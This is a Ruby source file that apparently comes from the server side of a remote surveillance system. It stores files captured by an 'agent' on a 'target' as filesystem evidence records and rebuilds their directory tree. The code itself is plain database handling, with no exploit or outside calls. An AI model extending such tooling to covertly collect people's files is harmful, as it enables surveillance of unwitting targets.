require_relative 'single_evidence'

module RCS
module FilecapProcessing
  extend SingleEvidence

  def duplicate_criteria
    {"type" => :file,
     "data.type" => :capture,
     "data.path"=> self[:data][:path],
     "data.md5"=> self[:data][:md5]}
  end

  def type
    :file
  end

  def process
    agent = get_agent
    target = agent.get_parent

    full_path = self[:data][:path]
    separator = full_path.match(/([\\\/])/)[0]
    elems = full_path.split(/[\\\/]/)

    # use the info of the file to create an entry in the filesystem structure
    create_filesystem_entry(agent, target, full_path, 0, self[:data][:size])

    # and recreate the intermediate directory structure
    until elems.size.eql? 1
      elems.pop
      path = elems.join(separator)
      path = separator if path.length.eql? 0
      create_filesystem_entry(agent, target, path, 1, 0)
    end

  end

  def create_filesystem_entry(agent, target, path, type, size)

    # don't add duplicates by removing the old entry
    # we cant update the :da since it's a shard key
    ::Evidence.target(target[:_id]).where({:aid => agent[:_id].to_s, :type => 'filesystem', 'data.path' => path, 'data.attr' => type}).each do |ev|
      ev.destroy
    end

    # insert the entry
    ::Evidence.target(target[:_id]).create do |ev|
      ev.aid = agent[:_id].to_s
      ev.type = 'filesystem'

      ev.da = self[:da].to_i
      ev.dr = self[:dr].to_i
      ev.rel = 0
      ev.blo = false
      ev.note = ""

      data = {}
      data[:path] = path
      data[:attr] = type # is a file (0) or directory (1)
      data[:size] = size

      ev.data = data
    end
  end

end # ApplicationProcessing
end # DB
